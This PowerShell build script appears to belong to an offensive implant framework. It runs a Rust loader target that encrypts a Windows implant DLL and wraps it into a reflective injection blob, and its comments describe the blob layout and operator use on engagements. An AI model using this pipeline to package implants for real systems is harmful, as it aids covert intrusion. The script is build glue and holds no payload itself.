# wrap_blob.ps1 — wrap the prod implant DLL into the reflective PIC blob.
#
# DEPENDENCY ON crates/nyx-loader (loader owner):
#   This script invokes `cargo run -p nyx-loader --example wrap -- <input> <output>`
#   (crates/nyx-loader/examples/wrap.rs), which reads <input_dll>, calls
#   nyx_loader::wrap_payload() with a random LoaderConfig, and writes the blob
#   to <output_blob>.
#
#   STATUS: the emitter now produces the REAL blob. wrap_payload() encrypts
#   the DLL (ChaCha20-Poly1305; per-invocation random key baked into the stub,
#   nonce in the NYX2 header) and assembles the definitive blob layout:
#
#     [LAYER1 + bridge][key 32B][NYX2 magic(4) enc_len(4) nonce(12)]
#     [ciphertext || 16B Poly1305 tag][LAYER2 code]
#
#   Verification of the blob is loader_probe_gate.ps1's job (Unicorn emu probe
#   first, rundll32 harness optional on interactive machines).
#
# Input:  crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll
#         (produced by build_prod_dll.ps1)
# Output: crates/nyx-loader/target/release/nyx_loader_blob.bin
#         (stage_assets.ps1 copies this into staging/)
#
# The wrap step is release-blocking per spec §4 (loader probe gate consumes
# this blob). We do NOT verify the blob injects cleanly here — that is
# loader_probe_gate.ps1's job.
#
# Assumes CWD = repo root. PowerShell 5.1.
$ErrorActionPreference = 'Stop'

# ---- T1 integration knobs (update here if T1 names the target differently) ----
# WRAP_MODE = 'example' → cargo run -p nyx-loader --example wrap
# WRAP_MODE = 'bin'     → cargo run -p nyx-loader -- wrap
$WRAP_PKG    = 'nyx-loader'
$WRAP_TARGET = 'wrap'
$WRAP_MODE   = 'example'

# ---- Inputs / outputs ----
$inputDll  = 'crates\implant-win\target\x86_64-pc-windows-msvc\release\nyx_implant_win.dll'
$outputDir = 'crates\nyx-loader\target\release'
$outputBlob = Join-Path $outputDir 'nyx_loader_blob.bin'

if (-not (Test-Path $inputDll)) {
    Write-Host "::error::prod DLL not found at $inputDll — run build_prod_dll.ps1 first."
    exit 1
}
if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }

Write-Host '== wrap_blob: invoke nyx-loader wrap target =='
# Build + run in one shot. --release so the chacha20poly1305 + PE parse path is
# the optimized build the operator will see on a real engagement.
$cargoArgs = @('run', '-p', $WRAP_PKG, '--release')
if ($WRAP_MODE -eq 'example') {
    $cargoArgs += @('--example', $WRAP_TARGET)
} elseif ($WRAP_MODE -eq 'bin') {
    # bin mode: no --example flag; the target name is the first positional after --.
    $cargoArgs += @('--', $WRAP_TARGET)
} else {
    Write-Host "::error::unknown WRAP_MODE='$WRAP_MODE' (expected 'example' or 'bin')"
    exit 1
}
$cargoArgs += @('--', $inputDll, $outputBlob)

Write-Host ("invoking: cargo " + ($cargoArgs -join ' '))
# PS 5.1 NATIVE-COMMAND STDERR TRAP — see build_prod_dll.ps1.
$prevEAP = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
    & cargo @cargoArgs 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "::error::nyx-loader wrap failed (exit $LASTEXITCODE)."
        Write-Host '::error::The emitter (nyx_loader::wrap_payload) failed to produce a blob;'
        Write-Host '::error::inspect the cargo output above. No reflective blob was produced.'
        exit 1
    }
}
finally {
    $ErrorActionPreference = $prevEAP
}

if (-not (Test-Path $outputBlob)) {
    Write-Host "::error::wrap target ran but produced no output blob at $outputBlob"
    exit 1
}
$size = (Get-Item $outputBlob).Length
# Sanity: blob must be larger than the DLL (loader stub + 20B NYX2 header +
# 16B tag = stub + 36 bytes overhead; ciphertext = plaintext len). A blob
# smaller than the input is a wrap_payload() bug.
$dllSize = (Get-Item $inputDll).Length
if ($size -lt $dllSize) {
    Write-Host "::error::blob ($size bytes) is smaller than input DLL ($dllSize bytes) — wrap_payload layout is wrong."
    exit 1
}
Write-Host ("== wrap_blob OK: {0} ({1} bytes; DLL was {2} bytes) ==" -f $outputBlob, $size, $dllSize)
